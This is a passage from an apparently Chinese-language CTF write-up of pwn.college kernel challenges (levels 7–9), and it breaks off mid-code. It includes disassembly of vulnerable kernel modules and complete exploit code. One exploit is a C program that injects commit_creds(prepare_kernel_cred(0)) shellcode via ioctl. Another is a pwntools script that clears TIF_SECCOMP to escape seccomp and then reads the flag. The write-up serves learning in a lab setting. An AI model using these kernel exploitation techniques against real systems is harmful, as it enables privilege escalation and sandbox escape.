class="line">.text.unlikely:0000000000000837                 mov     edx, 8</span><br><span class="line">.text.unlikely:000000000000083C                 lea     rsi, [arg+1008h]</span><br><span class="line">.text.unlikely:0000000000000843                 lea     rdi, [rsp+28h+shellcode_execute_addr]</span><br><span class="line">.text.unlikely:0000000000000848                 call    _copy_from_user ; PIC mode</span><br><span class="line">.text.unlikely:000000000000084D                 mov     rdx, [rsp+28h+shellcode_length]</span><br><span class="line">.text.unlikely:0000000000000851                 mov     rax, 0FFFFFFFFFFFFFFFEh</span><br><span class="line">.text.unlikely:0000000000000858                 cmp     rdx, 1000h</span><br><span class="line">.text.unlikely:000000000000085F                 ja      short loc_87D</span><br><span class="line">.text.unlikely:0000000000000861                 mov     rdi, cs:shellcode</span><br><span class="line">.text.unlikely:0000000000000868                 lea     rsi, [arg+8]</span><br><span class="line">.text.unlikely:000000000000086C                 call    _copy_from_user ; PIC mode</span><br><span class="line">.text.unlikely:0000000000000871                 mov     rax, [rsp+28h+shellcode_execute_addr]</span><br><span class="line">.text.unlikely:0000000000000876                 call    __x86_indirect_thunk_rax ; PIC mode</span><br><span class="line">.text.unlikely:000000000000087B                 xor     eax, eax</span><br><span class="line">.text.unlikely:000000000000087D</span><br><span class="line">.text.unlikely:000000000000087D loc_87D:                                ; CODE XREF: device_ioctl+39↑j</span><br><span class="line">.text.unlikely:000000000000087D                                         ; device_ioctl+73↑j</span><br><span class="line">.text.unlikely:000000000000087D                 mov     rcx, [rsp+28h+var_18]</span><br><span class="line">.text.unlikely:0000000000000882                 xor     rcx, gs:28h</span><br><span class="line">.text.unlikely:000000000000088B                 jz      short loc_892</span><br><span class="line">.text.unlikely:000000000000088D                 call    __stack_chk_fail ; PIC mode</span><br><span class="line">.text.unlikely:0000000000000892 ; ---------------------------------------------------------------------------</span><br><span class="line">.text.unlikely:0000000000000892</span><br><span class="line">.text.unlikely:0000000000000892 loc_892:                                ; CODE XREF: device_ioctl+9F↑j</span><br><span class="line">.text.unlikely:0000000000000892                 add     rsp, 18h</span><br><span class="line">.text.unlikely:0000000000000896                 pop     arg</span><br><span class="line">.text.unlikely:0000000000000897                 pop     cmd</span><br><span class="line">.text.unlikely:0000000000000898                 retn</span><br><span class="line">.text.unlikely:0000000000000898 device_ioctl    endp</span><br></pre></td></tr></table></figure>

<p>可以看到将参数<code>arg</code>复制给<code>shellcode_length</code>，<code>arg+0x1008</code>复制到<code>shellcode_execute_addr</code>，当<code>shellcode_length&lt;=0x1000</code>时把<code>arg+8</code>复制给<code>shellcode</code>，然后<code>jmp rax</code>，<code>rax</code>即<code>shellcode_execute_addr</code></p>
<p>所以按照对应偏移布置好参数和shellcode，<code>shelcode_length = 0x50</code>，<code>shellcode</code>执行<code>commit_creds(prepare_kernel_cred (0))</code>，<code>shellcode_execute_addr=0xffffc90000085000</code>（kernel里shellcode的地址）</p>
<h2 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *scTmp = <span class="string">&quot;\x56\x48\xc7\xc6\xc0\x90\x08\x81\x57\x48\x31\xff\xff\xd6\x48\x89\xc7\x48\xc7\xc6\x80\x8d\x08\x81\xff\xd6\x5f\x5e\xc3&quot;</span>;</span><br><span class="line">  <span class="keyword">char</span> *shellcode;</span><br><span class="line">  shellcode = mmap((<span class="keyword">void</span>*)<span class="number">0x81036000</span>, <span class="number">0x2000</span>, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_SHARED| MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span>(shellcode == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmap fail!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memcpy</span>(shellcode, <span class="string">&quot;\x50\x00\x00\x00\x00\x00\x00\x00&quot;</span>, <span class="number">8</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(shellcode + <span class="number">8</span>, scTmp, <span class="number">35</span>); <span class="comment">// commit_creds(prepare_kernel_cred(0));</span></span><br><span class="line">  <span class="built_in">memset</span>(shellcode + <span class="number">8</span> + <span class="number">35</span>, <span class="number">0x90</span>, <span class="number">4061</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(shellcode + <span class="number">4104</span>,  <span class="string">&quot;\x00\x50\x08\x00\x00\xc9\xff\xff&quot;</span>, <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/pwncollege&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, shellcode);</span><br><span class="line">  ioctl(fd, <span class="number">1337</span>, shellcode);</span><br><span class="line">  system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>一开始二杯了，地址弄错了结果以为shellcode是不可执行的，然后跟熊哥学了一手利用<code>xchg eax, esp</code>做栈迁移rop的方法，但是不懂什么原因最后一直调不通……</p>
<h1 id="level7-1"><a href="#level7-1" class="headerlink" title="level7.1"></a>level7.1</h1><p>一样</p>
<h1 id="level8-0"><a href="#level8-0" class="headerlink" title="level8.0"></a>level8.0</h1><p><strong>stucked for a long time</strong><br>因为网上也找不到wp，就在看完简单的介绍以后翻discord的历史记录，陆续有了思路，然后各种尝试和调试，才做了出来</p>
<p>总的来说还是挺有意思的，从kernel中修改一个标志位从而绕过沙箱</p>
<h2 id="background"><a href="#background" class="headerlink" title="background"></a>background</h2><p>沙箱逃逸<br>linux 5.4有效<br>新版linux中貌似没有看到<code>TIF_SECCOMP</code>，也没有深究该方法是否仍然有效</p>
<p><strong>flags is a bit field that, among many other things, holds a bit named TIF_SECCOMP</strong></p>
<p><code>/arch/x86/include/asm/thread_info.h</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TIF_SECCOMP		8	<span class="comment">/* secure computing */</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> &#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="keyword">long</span> flags; <span class="comment">/* low level flags */</span></span><br><span class="line">	u32 status;              <span class="comment">/* thread synchronous flags */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_THREAD_INFO_IN_TASK</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * For reasons of header soup (see current_thread_info()), this</span></span><br><span class="line"><span class="comment">	 * must be the first element of task_struct.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span>		<span class="title">thread_info</span>;</span></span><br><span class="line">	...</span><br><span class="line">	...</span><br></pre></td></tr></table></figure>

<p><code>/include/linux/seccomp.h</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">secure_computing</span><span class="params">(<span class="keyword">const</span> struct seccomp_data *sd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (unlikely(test_thread_flag(TIF_SECCOMP)))</span><br><span class="line">		<span class="keyword">return</span>  __secure_computing(sd);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>/kernel/seccomp.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __secure_computing(<span class="keyword">const</span> struct seccomp_data *sd)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> mode = current-&gt;seccomp.mode;</span><br><span class="line">	<span class="keyword">int</span> this_syscall;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (IS_ENABLED(CONFIG_CHECKPOINT_RESTORE) &amp;&amp;</span><br><span class="line">	    unlikely(current-&gt;ptrace &amp; PT_SUSPEND_SECCOMP))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	this_syscall = sd ? sd-&gt;nr :</span><br><span class="line">		syscall_get_nr(current, task_pt_regs(current));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (mode) &#123;</span><br><span class="line">	<span class="keyword">case</span> SECCOMP_MODE_STRICT:</span><br><span class="line">		__secure_computing_strict(this_syscall);  <span class="comment">/* may call do_exit */</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">case</span> SECCOMP_MODE_FILTER:</span><br><span class="line">		<span class="keyword">return</span> __seccomp_filter(this_syscall, sd, <span class="literal">false</span>);</span><br><span class="line">	<span class="comment">/* Surviving SECCOMP_RET_KILL_* must be proactively impossible. */</span></span><br><span class="line">	<span class="keyword">case</span> SECCOMP_MODE_DEAD:</span><br><span class="line">		WARN_ON_ONCE(<span class="number">1</span>);</span><br><span class="line">		do_exit(SIGKILL);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		BUG();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到<code>secure_computing(const struct seccomp_data *sd)</code>中检测<code>TIF_SECCOMP</code>标志位，如果不为空则进入<code>__secure_computing(const struct seccomp_data *sd)</code>中，而后者就是实现沙箱的函数了</p>
<p>接着溯源，<code>TIF_SECCOMP</code>来自<code>flags</code>，是<code>thread_info</code>结构体的一个变量，而<code>thread_info</code>又是<code>task_struct</code>结构体的一个变量。</p>
<p><code>task_struct</code>结构体，即Linux内核的进程控制块<br>所以如果能够执行<code>current_task_struct-&gt;thread_info.flags &amp;= ~(1&lt;&lt;TIF_SECCOMP)</code>，就能在当前进程完成沙箱逃逸（escaping seccomp）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>环境里给了两个文件，一个elf文件，一个ko文件<br>看一下权限</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hacker@babykernel_level8:~$ ls ../../challenge/ -la</span><br><span class="line">total 288</span><br><span class="line">drwsr-xr-x 1 root root   4096 Mar  8 12:51 .</span><br><span class="line">drwxr-xr-x 1 root root   4096 Mar  8 12:51 ..</span><br><span class="line">-rwsr-xr-x 1 root root  17528 Nov 20 07:29 babykernel_level8.1</span><br><span class="line">-rwsr-xr-x 1 root root 265800 Nov 20 01:23 babykernel_level8.1.ko</span><br></pre></td></tr></table></figure>
<blockquote>
<p>权限分三组：属主 属组 其他用户 U+G+O<br>U user<br>G group<br>O other</p>
</blockquote>
<p>elf文件对我们来说是可执行的，代码大致如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;###&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;### Welcome to %s!\n&quot;</span>, *argv);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;###&quot;</span>);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You may upload custom shellcode to do whatever you want.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;For extra security, this challenge will only allow certain system calls!\n&quot;</span>);</span><br><span class="line">  v5 = open(<span class="string">&quot;/proc/pwncollege&quot;</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Opened `/proc/pwncollege` on fd %d.\n&quot;</span>, v5);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_4022A5);</span><br><span class="line">  <span class="keyword">if</span> ( mmap(<span class="number">0x31337000</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">0L</span>L) != <span class="number">825454592</span> )</span><br><span class="line">    __assert_fail(<span class="string">&quot;shellcode == (void *)0x31337000&quot;</span>, <span class="string">&quot;&lt;stdin&gt;&quot;</span>, <span class="number">0x62</span>u, <span class="string">&quot;main&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Mapped 0x1000 bytes for shellcode at %p!\n&quot;</span>, <span class="number">0x31337000</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Reading 0x1000 bytes of shellcode from stdin.\n&quot;</span>);</span><br><span class="line">  v6 = read(<span class="number">0</span>, <span class="number">0x31337000</span>, <span class="number">0x1000</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This challenge is about to execute the following shellcode:\n&quot;</span>);</span><br><span class="line">  print_disassembly(<span class="number">825454592L</span>L, v6);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_4022A5);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Restricting system calls (default: allow).\n&quot;</span>);</span><br><span class="line">  v7 = seccomp_init(<span class="number">2147418112L</span>L);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">511</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Allowing syscall: %s (number %i).\n&quot;</span>, <span class="string">&quot;write&quot;</span>, <span class="number">1L</span>L);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( seccomp_rule_add(v7, <span class="number">0L</span>L, i, <span class="number">0L</span>L) )</span><br><span class="line">    &#123;</span><br><span class="line">      __assert_fail(<span class="string">&quot;seccomp_rule_add(ctx, SCMP_ACT_KILL, i, 0) == 0&quot;</span>, <span class="string">&quot;&lt;stdin&gt;&quot;</span>, <span class="number">0x78</span>u, <span class="string">&quot;main&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Executing shellcode!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( seccomp_load(v7) )</span><br><span class="line">    __assert_fail(<span class="string">&quot;seccomp_load(ctx) == 0&quot;</span>, <span class="string">&quot;&lt;stdin&gt;&quot;</span>, <span class="number">0x7D</span>u, <span class="string">&quot;main&quot;</span>);</span><br><span class="line">  MEMORY[<span class="number">0x31337000</span>]();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;### Goodbye!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看到打开了<code>/proc/pwncollege</code>，然后允许输入0x1000长度的shellcode，并添加了一堆禁用的系统调用，只留了一个write。最后会执行我们输入的shellcode</p>
<p>在看一下这次<code>/proc/pwncollege</code>是只允许root读写的</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hacker@vm_babykernel_level8:~$ ls ../../proc/ -la | grep pwn</span><br><span class="line">-rw-------   1 root   root                 0 Mar  8 14:08 pwncollege</span><br></pre></td></tr></table></figure>

<h3 id="device-write-4"><a href="#device-write-4" class="headerlink" title="device_write"></a>device_write</h3><p>write将从用户空间复制v5长度的shellcode然后执行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">device_write</span><span class="params">(file *file, <span class="keyword">const</span> <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v5; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  printk(&amp;unk_528, file, buffer, length, offset);</span><br><span class="line">  v5 = <span class="number">4096L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( length &lt;= <span class="number">0x1000</span> )</span><br><span class="line">    v5 = length;</span><br><span class="line">  v6 = copy_from_user(shellcode, buffer, v5);</span><br><span class="line">  (shellcode)();</span><br><span class="line">  <span class="keyword">return</span> length - v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>用户空间执行elf文件，写入shellcode，其中调用write，将使用在内核态的shellcode写入，让内核态执行的shellcode将当前进程flags对应的<code>TIF_SECCOMP</code>标志位清零，然后执行<code>cred_commit(prepare_kernel_cred(0))</code>提权，接下来ret返回用户态，接着在用户态执行orw读出flag</p>
<p><strong>如何寻找TIF_SECCOMP？</strong><br>查看官方给出的本地样例并进行调试（或者直接看IDA反汇编ko）<br>样例代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">current-&gt;thread_info.flags &amp;= ~_TIF_SECCOMP;</span><br></pre></td></tr></table></figure>
<p>对应汇编</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000000006E                 mov     rbx, gs:current_task</span><br><span class="line">...</span><br><span class="line">.text:0000000000000086                 and     qword ptr [rbx], 0FFFFFFFFFFFFFEFFh</span><br></pre></td></tr></table></figure>
<p>也就是说我们能够通过<code>gs</code>寄存器加上特定偏移指向<code>current-&gt;thread_info.flags</code><br>动态调式发现这个偏移是<code>0x15d00</code></p>
<h2 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&quot;../../challenge/babykernel_level8.0&quot;</span>)</span><br><span class="line"></span><br><span class="line">sc = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov rax, 1</span></span><br><span class="line"><span class="string">mov rdi, 3</span></span><br><span class="line"><span class="string">lea rsi, [rip+kernel_shellcode]</span></span><br><span class="line"><span class="string">mov rdx, 0x200</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/* open(&#x27;/flag&#x27;) */</span></span><br><span class="line"><span class="string">mov rax, 0x67616c662f</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">xor rsi, rsi</span></span><br><span class="line"><span class="string">xor rdx, rdx</span></span><br><span class="line"><span class="string">mov rax, 2</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">xor rax, rax</span></span><br><span class="line"><span class="string">mov rdi, 4</span></span><br><span class="line"><span class="string">mov rsi, rbp</span></span><br><span class="line"><span class="string">mov rdx, 0x50</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rax, 1</span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rsi, rbp</span></span><br><span class="line"><span class="string">mov rdx,0x50</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">kernel_shellcode:</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    mov     rbx, gs:0x15d00</span></span><br><span class="line"><span class="string">    and     qword ptr [rbx], 0xFFFFFFFFFFFFFEFF</span></span><br><span class="line"><span class="string">    pop rbx</span></span><br><span class="line"><span class="string">    push rsi</span></span><br><span class="line"><span class="string">    mov rsi, 0xffffffff810890c0</span></span><br><span class="line"><span class="string">    push rdi</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    call rsi</span></span><br><span class="line"><span class="string">    mov rdi, rax</span></span><br><span class="line"><span class="string">    mov rsi, 0xffffffff81088d80</span></span><br><span class="line"><span class="string">    call rsi</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    pop rsi</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">r.sendline(asm(sc))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="后记-1"><a href="#后记-1" class="headerlink" title="后记"></a>后记</h2><p>可能有人会跟我一样想到，即然完成了seccomp escape，又提了权，那拿shell再cat不也能读flag吗？<br>事实上我也尝试了，然后发现能够获得shell但是不管输入什么，都只会看到<code>bad system call</code>。也就是说，沙箱处于正常运作中。</p>
<p>根本原因在于：我们修改的只是<strong>当前进程</strong>对应flags中的标志位<br>执行<code>execve(&quot;/bin/sh&quot;,0,0)</code>时，实际上</p>
<blockquote>
<p>execve函数在父进程中fork一个子进程，在子进程中调用exec函数启动新的程序</p>
</blockquote>
<p>而子进程中task对应的flags中TIF_SECCOMP仍然存在，seccomp保持正常的执行，所以会只会得到<code>bad system call</code></p>
<p><strong>iow</strong>，本题展示的方法仅仅对当前进程逃逸沙箱有效</p>
<p>收获颇丰的一道题</p>
<h1 id="level8-1"><a href="#level8-1" class="headerlink" title="level8.1"></a>level8.1</h1><p>no deference</p>
<h1 id="level9-0"><a href="#level9-0" class="headerlink" title="level9.0"></a>level9.0</h1><h2 id="device-write-5"><a href="#device-write-5" class="headerlink" title="device_write"></a>device_write</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">device_write</span><span class="params">(file *file, <span class="keyword">const</span> <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v4; <span 